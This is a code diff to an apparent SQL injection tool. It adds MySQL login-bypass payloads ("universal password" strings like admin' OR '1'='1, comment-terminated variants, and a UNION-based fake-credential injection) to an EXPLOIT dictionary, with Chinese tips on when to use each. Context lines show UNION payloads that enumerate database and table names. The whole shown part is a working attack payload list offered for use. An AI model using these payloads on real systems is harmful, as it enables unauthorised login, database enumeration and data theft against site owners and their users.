@@ -61,6 +61,16 @@ DETECTION: Dict[str, List[str]] = {
 EXPLOIT: Dict[str, List[Dict[str, str]]] = {
     # ── MySQL ────────────────────────────────────────────
     "MySQL": [
+        # ── 认证/登录绕过 ──
+        {"name": "🔑 万能密码-OR", "payload": "admin' OR '1'='1", "tip": "经典万能密码，登录绕过首选"},
+        {"name": "🔑 万能密码-OR 1=1", "payload": "admin' OR 1=1-- ", "tip": "-- 注释掉后续SQL"},
+        {"name": "🔑 万能密码-OR 1=1#", "payload": "admin' OR 1=1#", "tip": "# 注释，MySQL 特有"},
+        {"name": "🔑 万能密码-永真", "payload": "' OR '1'='1' --", "tip": "无需用户名，直接进"},
+        {"name": "🔑 万能密码-括号", "payload": "admin') OR ('1'='1", "tip": "括号闭合变体"},
+        {"name": "🔑 万能密码-双引号", 'payload': 'admin\" OR \"1\"=\"1', "tip": "双引号闭合"},
+        {"name": "🔑 注释绕过-末尾", "payload": "admin' --", "tip": "注释掉密码校验部分"},
+        {"name": "🔑 UNION绕过", "payload": "' UNION SELECT 1,'admin','fake'-- ", "tip": "构造假密码哈希注入"},
+        # ── 联合查询 ──
         {"name": "当前库名", "payload": "' UNION SELECT database(),NULL,NULL-- "},
         {"name": "所有库名", "payload": "' UNION SELECT group_concat(schema_name),NULL,NULL FROM information_schema.schemata-- "},
         {"name": "表名 (当前库)", "payload": "' UNION SELECT group_concat(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- "},
